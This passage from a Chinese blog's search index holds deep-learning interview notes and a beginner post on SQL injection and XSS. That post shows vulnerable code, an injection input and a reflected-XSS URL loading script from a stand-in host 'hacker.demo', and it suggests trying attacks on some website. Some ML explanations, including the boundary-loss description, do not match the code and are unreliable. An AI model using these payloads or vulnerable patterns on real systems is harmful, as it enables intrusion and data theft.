class="python">import torchdef boundary_loss(pred, target):    &quot;&quot;&quot;    Implementation of boundary loss in PyTorch.    :param pred: predicted segmentation mask, dimension: (N, C, H, W)    :param target: ground-truth segmentation mask, dimension: (N, C, H, W)    :return: boundary loss value    &quot;&quot;&quot;    bce_loss = torch.nn.BCELoss(reduction=&quot;mean&quot;)        # Compute the gradient of the target mask along both spatial dimensions    target_x_grad = torch.abs(target[:, :, :, :-1] - target[:, :, :, 1:])    target_y_grad = torch.abs(target[:, :, :-1, :] - target[:, :, 1:, :])    target_edge = target_x_grad + target_y_grad        # Compute the gradient of the predicted mask along both spatial dimensions    pred_x_grad = torch.abs(pred[:, :, :, :-1] - pred[:, :, :, 1:])    pred_y_grad = torch.abs(pred[:, :, :-1, :] - pred[:, :, 1:, :])    pred_edge = pred_x_grad + pred_y_grad        # Compute the boundary loss, which is the mean of the element-wise product of     # the binary target edge (1 inside the boundary, 0 outside) and the distance     # between the predicted edge and the target edge    loss = bce_loss(target_edge, torch.clamp(pred_edge, 0, 1)) * target_edge.mean()        return loss</code></pre><p>在上述代码中，我们首先定义了一个标准的BCELoss作为Boundary Loss的基础。然后，我们以类似于Sobel算子的方式计算了目标和预测掩码的梯度，并将它们相加得到两个边缘掩码。接下来，我们计算了Boundary Loss，这是目标边缘掩码中每个像素距离它最近的预测边缘掩码像素的欧氏距离的平均值。我们在这里使用了torch.clamp(0,1)来进行预测边缘掩码的截断，以避免边缘像素梯度过大导致训练不稳定。</p><p>最后要注意的一点是，由于在计算Boundary Loss时我们使用了二进制掩码来筛选边界区域，因此我们需要将目标和预测掩码的数值范围压缩到[0,1]之间。如果您的数据集的标签具有多个类别，则需要对每个类别分别计算Boundary Loss，并对这些损失值进行加权平均。</p>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度学习面试(二)</title>
      <link href="/2022/04/07/day_two/"/>
      <url>/2022/04/07/day_two/</url>
      
        <content type="html"><![CDATA[<p>说说XGBoost和GBDT的不同:</p><ol><li>XGBoost和GBDT都是基于树的集成学习算法，但在实现细节和性能上存在一些不同：</li><li>对于目标函数的优化：XGBoost采用了类似于牛顿法的二阶泰勒展开方式进行目标函数的极值优化，加快了收敛速度；而GBDT采用的是一阶泰勒展开。</li><li>对于特征的选择：XGBoost采用增益和覆盖度的综合指标选择特征；GBDT采用的是信息熵或基尼指数。</li><li>对于剪枝的处理：XGBoost对于树的结构进行分裂之后，采用正则化的方式进行剪枝；GBDT采用的是贪心算法来选择最优分裂点。</li><li>对于模型的并行计算：XGBoost使用了多线程并行运算，在内存使用上更加高效；GBDT则只能串行计算。</li><li>对于缺失值的处理：XGBoost可以自动地学习处理缺失值，GBDT则需要另外进行预处理。<br>综上所述，XGBoost在目标函数优化、特征选择、树结构剪枝以及模型的并行计算方面都具有更大的优势，因此在许多竞赛中取得了很好的成绩。但在数据处理方面相对要求更高。而GBDT则更为直观易懂，数据要求也相对较低。</li></ol><p>XGBoost和GBDT都是决策树集成学习算法，它们的区别主要涵盖以下几个方面：</p><pre><code>1. 算法原理：GBDT是一种基于残差学习的决策树集成算法，每一次学习目标是拟合当前模型残差，使得后续模型能够更好地拟合样本。而XGBoost是一种基于梯度提升的决策树算法，每一次学习目标是拟合当前模型梯度，使得后续模型能够更好地逼近损失函数。2. 损失函数：在实际应用中，XGBoost支持更广泛的损失函数选择，除了GBDT中常用的平方误差和绝对误差，还支持logistic、softmax等分类问题的损失函数。而且XGBoost能够集成不同的损失函数。3. 正则化：XGBoost加入了二阶导数信息来进行正则化，防止过拟合效果更好。同时，XGBoost还可以通过结构化的正则化方式减少过拟合现象。4. 并行化处理：相比于GBDT，XGBoost引入了缓存访问和特征采样等并行处理方式，可以通过并行化处理更快地训练模型。5. 可扩展性：XGBoost拓展性更强，支持分布式计算，可以在大数据环境下使用，而GBDT则只能在单机上运行。</code></pre><p>总的来说，XGBoost是一个更加高效、灵活、容易扩展的算法，能够更好地解决现实生活中的复杂问题，在机器学习和数据挖掘领域中得到了广泛应用。</p><h3 id="高并发技术"><a href="#高并发技术" class="headerlink" title="高并发技术"></a>高并发技术</h3><p>实现高并发技术的方式有以下几种：</p><ol><li>负载均衡：将请求分发到多个服务器上，避免单一服务器负载过高。</li><li>缓存技术：将数据缓存到内存中，减少数据库的访问次数。</li><li>分布式技术：将系统拆分成多个独立的子系统，每个子系统独立运行，提高系统的并发能力。</li><li>异步处理：将一些耗时的操作放到异步线程中进行处理，避免阻塞主线程。</li><li>数据库优化：通过优化数据库结构、索引、SQL语句等方式，提高数据库的性能。</li><li>CDN加速：将静态资源（如图片、视频等）缓存到CDN节点上，加速用户访问速度。</li><li>消息队列：通过消息队列实现异步处理，提高系统的并发能力。</li><li>集群技术：将多台服务器组成集群，实现负载均衡和故障转移。</li><li>分库分表：将数据库拆分成多个库和表，提高数据库的并发性能。</li><li>代码优化：通过优化代码结构、算法等方式，提高系统的性能和并发能力。</li></ol><h3 id="特征选择的方法"><a href="#特征选择的方法" class="headerlink" title="特征选择的方法"></a>特征选择的方法</h3><ol><li>Filter方法：通过对数据集进行统计分析，选出与目标变量相关性较高的特征。常用的统计方法包括相关系数、卡方检验、方差分析等。</li><li>Wrapper方法：将特征选择看作是一个搜索问题，通过不断地试错，找到最优的特征子集。常用的搜索算法包括递归特征消除（Recursive Feature Elimination）和遗传算法（Genetic Algorithm）等。</li><li>Embedded方法：在模型训练的过程中，同时进行特征选择。常用的方法包括Lasso回归、岭回归、决策树、随机森林等。</li><li>基于树模型的特征选择方法：通过构建决策树或随机森林等树模型，计算每个特征的重要性得分，并选择重要性得分高的特征。</li><li>PCA（Principal Component Analysis）方法：通过主成分分析，将原始特征转化为一组新的不相关的特征，然后选取其中对目标变量有较大影响的特征。</li><li>模型集成方法：通过将多个模型的预测结果进行集成，筛选出重要的特征。常用的集成方法包括投票法、平均法、堆叠法等。</li><li>基于深度学习的特征选择方法：通过深度神经网络等深度学习模型，自动学习并提取特征，然后选取对目标变量有影响的特征。</li><li>基于信息增益的特征选择方法：通过计算每个特征对于分类的信息增益，选取信息增益高的特征。</li><li>基于稳定性选择的特征选择方法：通过对数据集进行多次随机采样和特征选择，筛选出在不同采样和特征选择情况下都被选中的特征。</li><li>基于数据降维的特征选择方法：通过将数据降维到低维空间，然后选取对目标变量有影响的低维特征。常用的降维方法包括主成分分析、因子分析、独立成分分析等</li></ol><h4 id="深度和宽度分别对神经网络的影响，相同参数量下，更深更窄的神经网络和更浅更宽的神经网络对模型的影响"><a href="#深度和宽度分别对神经网络的影响，相同参数量下，更深更窄的神经网络和更浅更宽的神经网络对模型的影响" class="headerlink" title="深度和宽度分别对神经网络的影响，相同参数量下，更深更窄的神经网络和更浅更宽的神经网络对模型的影响"></a>深度和宽度分别对神经网络的影响，相同参数量下，更深更窄的神经网络和更浅更宽的神经网络对模型的影响</h4><pre><code>深度——神经网络的层数宽度——每层的通道数分辨率——是指网络中特征图的分辨率</code></pre><p>深度和宽度是深度神经网络的两个基本维度，分辨率不仅取决于网络，也与输入图片的尺寸有关。</p><p>简单总结就是：</p><pre><code>1.更深的网络，有更好的非线性表达能力，可以学习更复杂的变换，从而可以拟合更加复杂的特征，更深的网络可以更简单地学习复杂特征。网络加深会带来梯度不稳定、网络退化的问题，过深的网络会使浅层学习能力下降。深度到了一定程度，性能就不会提升了，还有可能会下降。2.足够的宽度可以保证每一层都学到丰富的特征，比如不同方向，不同频率的纹理特征。宽度太窄，特征提取不充分，学习不到足够信息，模型性能受限。宽度贡献了网络大量计算量，太宽的网络会提取过多重复特征，加大模型计算负担。3.提升网络性能可以先从宽度入手，提高每一层的通道的利用率、用其他通道的信息补充较窄的层，找到宽度的下限，用尽量小的计算量得到更好的性能。</code></pre><h4 id="PCA和LDA的区别"><a href="#PCA和LDA的区别" class="headerlink" title="PCA和LDA的区别"></a>PCA和LDA的区别</h4><p>PCA和LDA是两种常见的降维技术，它们的区别主要体现在以下几个方面：<br>目的不同：PCA是一种无监督的降维技术，其主要目的是尽可能地保留原始数据的方差信息；而LDA是一种有监督的降维技术，其主要目的是在保留原始数据的信息的同时，找到最能区分不同类别的特征。<br>输入数据不同：PCA可以应用于任何类型的数据，包括连续型和离散型数据，而LDA只能应用于有类别标签的连续型数据。<br>输出结果不同：PCA得到的结果是一组新的无相关变量，这些变量被称为主成分；而LDA得到的结果是一组新的特征变量，这些变量被设计成能够最好地区分不同类别的数据。<br>适用场景不同：PCA通常用于数据的预处理和降维，以便更好地可视化和理解数据；而LDA通常用于分类和识别问题，以提高分类的准确度。</p>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈SQL注入，XSS攻击</title>
      <link href="/2019/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
      <url>/2019/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>作为计算机小白，一直都认为黑客很牛逼所以简单的了解一下这反面的知识——信息安全<br>黑客是个英译词，译作Hacker。黑客攻击或者黑计算机的方式多种多样，主要分为两种：<br><code>（1）非破坏性的攻击：一般是为了扰乱系统的运行，并不盗窃系统资料，仅仅只是使服务器暂时失去对外提供服务的能力，通常采用拒绝服务攻击或信息炸弹</code><br> <code>（2）破坏性攻击：是以侵入他人电脑系统、盗窃系统保密信息、破坏目标系统的数据为目的</code><br> 常见的攻击有DDOS，CSRF，Dos等，通常通过的途径有病毒式，洪水式，系统漏洞等。<br> 下面简单的介绍几种</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p> <code> 常见的注入式攻击，通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句</code><a href="https://baike.baidu.com/item/sql%E6%B3%A8%E5%85%A5/150289?fr=aladdin">添加链接描述</a><br> 造成可以进行SQL注入的本质原因就是未将代码与数据进行严格的隔离，导致用户在读取数据的时候，错误的把数据作为代码的一部分执行。<br> 下面举个简单的例子：</p><pre><code class="js">var testCondition;testCondition = Request.from(&quot;testCondition&quot;)var sql =&quot;select * from TableA where id=&#39;&quot;+ testCondition +&quot;&#39;&quot;;</code></pre><p>在上面的例子当中，如果用户输入的ID只是一个数字当然没有任何问题，但是如果用“;‘隔开后，在testCondition里面插入其他SQL语句，则会出现意想不到的结果。例如输入drop，delete等。例如你不小心输入”#--!#@”这样的字符然后保存使得数据库跟新就会使where后面的信息被注释掉了，执行语句就变成了</p><pre><code class="js">updata table set memo=&quot;&quot;# --! #(@&quot; where use_id=xxxxxxx;</code></pre><p>使得全数据库的memo字段的数据都被跟新了，而不是你一个人的数据。<br>下面有几个兄弟写的很详细，大家可以去看看<br>（1）<a href="https://blog.csdn.net/ylw_bk/article/details/78327748">最详细的SQL注入教程–易利伟</a><br>（2）<a href="https://www.cnblogs.com/pursuitofacm/p/6706961.html">web完全篇之SQL</a><br>（3）<a href="https://www.cnblogs.com/wang-sai-sai/p/10234568.html">SQL注入攻击</a><br>（4）<a href="https://cloud.tencent.com/developer/news/61383">用sql注入攻破网站</a><br>大家可以找个一个肉鸡网站去试试或者自己写一个肉鸡网站也是个不错的选择<br>SQL注入的危害极大，在进行程序设计时我们可以从下面几个方面进行预防</p><pre><code>（1）过滤用户输入参数中的特殊字符，从而降低被SQL注入的风险</code></pre><pre><code>（2）禁止使用字符串拼接的SQL语句，严格使用参数绑定传入的SQL参数</code></pre><pre><code>（3）合理使用数据库访问框架提供的防注入机制</code></pre><h2 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h2><pre><code class="html">    XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets,CSS) 的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞， 它允许恶意web用户将代码植入到提供给其它用户使用的页面中。即黑客通过技术手段向 正常用户请求的HTML页面中插入恶意脚本，从而可以执行任意脚本</code></pre><h6 id="xss的分类"><a href="#xss的分类" class="headerlink" title="xss的分类"></a>xss的分类</h6><p>（1）反射型XSS</p><pre><code>   恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的。</code></pre><p>（2）存储型XSS</p><pre><code>     恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性，比较常见场景是在博客，论坛等社交网站上，但OA系统，和CRM系统上也能看到它身影，比如某CRM系统的客户投诉功能上存在XSS存储型漏洞，黑客提交了恶意攻击代码，当系统管理员查看投诉信息时恶意代码执行，窃取了客户的资料，然而管理员毫不知情，这就是典型的XSS存储型攻击。</code></pre><p>  (3)  DOM型XSS</p><pre><code>其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。</code></pre><p>  比如在2011年微博左右XSS蠕虫攻击事件，攻击者就利用微博发布功能中未对action-data漏洞做有效的过滤，在发布微博信息的时候戴上了包含攻击脚本的URL，用户访问该微博是便疯狂加载恶意脚本，该脚本会让用户以自己的账号自动转发同一条微博，通过这样的病毒式扩散，大量用户受到攻击。<br>  下面举个简单的实例可能会导致反射型XSS的文件：</p><pre><code class="html">&lt;div&gt;&lt;h3&gt;反射型XSS实例&lt;/h3&gt;&lt;br&gt;用户:&lt;%=request.getParamer(&quot;useName&quot;)%&gt;&lt;br&gt;系统错误信息：&lt;%=request.getParamer(&quot;errorMessage&quot;)%&gt;&lt;div&gt;</code></pre><p>上面的代码从HTTP请求中取得了userName和errorMessage两个参数，并直接输出到HTML中用于展示，当构造这样一种URL时就出现了反射型XSS，用户便会执行脚本文件</p><pre><code class="js">http://xss.demo/self-xss.jsp?userName=666&lt;script&gt;alert(&quot;666&quot;)&lt;/script&gt;&amp;errorMessage=XSS实例&lt;script scr=http://hacker.demo/xss-script.js&gt;</code></pre><h5 id="XSS攻击的预防主要是通过对用户的输入数据进行过滤和转义，如使用jsonp框架对用户输入的字符串作XSS过滤，使用Sping框架中的HtmlUtils对用户输入的字符串做html转义等"><a href="#XSS攻击的预防主要是通过对用户的输入数据进行过滤和转义，如使用jsonp框架对用户输入的字符串作XSS过滤，使用Sping框架中的HtmlUtils对用户输入的字符串做html转义等" class="headerlink" title="XSS攻击的预防主要是通过对用户的输入数据进行过滤和转义，如使用jsonp框架对用户输入的字符串作XSS过滤，使用Sping框架中的HtmlUtils对用户输入的字符串做html转义等"></a>XSS攻击的预防主要是通过对用户的输入数据进行过滤和转义，如使用jsonp框架对用户输入的字符串作XSS过滤，使用Sping框架中的HtmlUtils对用户输入的字符串做html转义等</h5><p>下面是几篇写的较为详细的XSS攻击博客<br>（1）<a href="https://www.cnblogs.com/stefanieszx11/p/8602138.html">web安全之XSS攻击</a><br>（2）<a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label12">XSS跨站脚本攻击</a><br>（3）<a href="https://www.cnblogs.com/digdeep/p/4695348.html">XSS防御方法</a><br>（4）<a href="https://www.cnblogs.com/shawWey/p/8480452.html">浅谈XSS攻击原理</a><br>时间匆匆而逝，下次我再来分享一点点关于第三种黑客攻击：CSRF的知识</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> SQL </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
